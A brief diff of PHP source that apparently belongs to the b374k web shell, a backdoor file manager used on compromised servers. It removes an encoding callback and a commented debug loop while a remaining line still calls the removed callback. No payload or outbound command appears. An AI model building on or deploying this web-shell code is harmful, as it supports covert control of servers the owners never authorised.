@@ -4,19 +4,10 @@ block_bot();
 auth();
 chdir(get_cwd());
 $nav = get_nav(get_cwd());
-function array_map_cb($e) {
-    if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
-        $e = convert_encode('utf-8', $GLOBALS['encode'], $e);
-    }
-    return $e;
-}
 $p = array_map("array_map_cb", get_post());
 $cwd = html_safe(get_cwd());
 $GLOBALS['module'] = array();
 
-/*foreach ($p as $key => $value) {
-    error_log("b374k> ".$key."=".$value);
-}*/
 function encode_cwd($cwd) {
     if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
         $cwd = convert_encode($GLOBALS['encode'], 'utf-8', $cwd);
